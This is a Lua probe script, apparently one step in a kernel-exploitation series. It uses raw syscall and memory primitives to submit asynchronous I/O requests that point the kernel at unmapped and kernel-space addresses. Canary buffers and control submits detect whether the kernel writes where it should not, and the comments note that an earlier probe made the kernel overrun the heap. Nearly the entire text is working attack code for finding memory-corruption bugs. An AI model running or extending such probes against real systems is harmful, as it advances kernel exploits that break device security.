-- CRASH_CLASS: HIGH
-- PROBE 352j: hostile AIO destinations, without the heap-smashing count case
--
-- 352h shows the queue is healthy in this process (24 outstanding requests, all
-- completed with a 0x10 result), so a failure now means the case failed rather
-- than the queue being spent. Every hostile case is therefore followed by a
-- plain control submit: if the hostile case fails and the control succeeds, the
-- destination was refused; if both fail, the queue was the reason.
--
-- Cases, in increasing order of danger:
--   [1] a byte count twenty times the buffer
--   [2] a destination that is not mapped
--   [3] a destination in the kernel half
--   [4] a result pointer in the kernel half

print("=== PROBE 352j: AIO DESTINATIONS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function hi_lo(v)
    local h, l = get_hi_lo(v)
    return to_num(h), to_num(l)
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wq(addr, value)
    pcall(function() memory.write_qword(addr, value) end)
end
local function wd(addr, value)
    pcall(function() memory.write_dword(addr, value) end)
end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return -999
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function open_path(path, flags)
    local ok, rv = pcall(function() return sc(5)(put_str(path), uint64(flags), Z) end)
    if not ok then return -1 end
    return sgn(rv)
end

local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local canary = memory.alloc(0x1000)
local result = memory.alloc(0x200)
local ids = memory.alloc(0x200)
local states = memory.alloc(0x100)
for i = 0, 0x3F do
    wq(reqs + i * 8, 0)
    wd(result + i * 4, 0)
    wd(ids + i * 4, 0)
    wd(states + i * 4, 0)
end
for i = 0, 0x3FF do
    wd(data + i * 4, 0)
    wd(canary + i * 4, 0xA5A5A5A5)
end

local fd = open_path("/dev/urandom", 0)
print(string.format("fd = %d", fd))
if fd < 0 then
    print("=== 352j DONE ===")
    return
end

local function canary_intact()
    for i = 0, 0xFF do
        if rd(canary + i * 4) ~= 0xA5A5A5A5 then return false, i * 4 end
    end
    return true, -1
end

local function once(len, buf, res)
    wq(reqs + 0x00, 0)
    wq(reqs + 0x08, len)
    local bh, bl = hi_lo(buf)
    wd(reqs + 0x10, bl) wd(reqs + 0x14, bh)
    local rh, rl = hi_lo(res)
    wd(reqs + 0x18, rl) wd(reqs + 0x1C, rh)
    wd(reqs + 0x20, fd)
    wd(reqs + 0x24, 0)
    wd(ids, 0)
    wd(result, 0)
    wd(result + 4, 0)
    local ok1, r1 = pcall(function()
        return sc(669)(uint64(1), uint64(reqs), uint64(1), uint64(1), uint64(ids))
    end)
    local sub = ok1 and sgn(r1) or nil
    local id = rd(ids)
    wd(states, 0)
    local ok2, r2 = pcall(function()
        return sc(664)(uint64(ids), uint64(1), uint64(states))
    end)
    local pol = ok2 and sgn(r2) or nil
    local res0 = rd(result)
    local good, where = canary_intact()
    if id and id ~= 0 then
        wd(ids, id)
        pcall(function() return sc(662)(uint64(ids), uint64(1), uint64(states)) end)
    end
    return sub, pol, rd(states), res0, good, where, id
end

local function show(label, len, buf, res)
    local sub, pol, state, res0, good, where, id = once(len, buf, res)
    print(string.format("  %-30s sub=%-3s poll=%-3s state=0x%X id=0x%X",
        label, tostring(sub), tostring(pol), state, id))
    print(string.format("      result[0]=0x%08X canary=%s", res0,
        good and "intact" or ("CHANGED at +0x" .. string.format("%X", where))))
end

local K = uint64(string.format("0x%X%08X", 0xFFFF8000, 0x00000000))

-- [1] (a count twenty times the buffer) is measured already: 352i died inside
-- it, the kernel wrote the whole count through the process heap and the loader
-- faulted. Not repeated here.

print("[2] a destination that is not mapped")
show("case: data=0x1000", 16, uint64(0x1000), uint64(result))
show("control", 16, uint64(data), uint64(result))

print("[3] a destination in the kernel half")
show("case: data=kernel", 16, K, uint64(result))
show("control", 16, uint64(data), uint64(result))

print("[4] a result pointer in the kernel half")
show("case: result=kernel", 16, uint64(data), K)
show("control", 16, uint64(data), uint64(result))

print("")
print("=== 352j DONE ===")
